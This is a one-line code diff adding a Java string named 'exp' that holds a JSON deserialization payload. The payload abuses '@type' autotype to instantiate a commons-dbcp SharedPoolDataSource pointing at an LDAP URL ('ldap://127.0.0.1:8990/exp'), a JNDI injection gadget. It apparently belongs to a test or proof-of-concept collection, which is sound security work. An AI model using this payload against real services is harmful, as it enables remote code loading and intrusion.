@@ -1,0 +1,1 @@
+String exp = "{\"@type\":\"org.apache.commons.dbcp.datasources.SharedPoolDataSource\",\"dataSourceName\":\"ldap://127.0.0.1:8990/exp\"}";
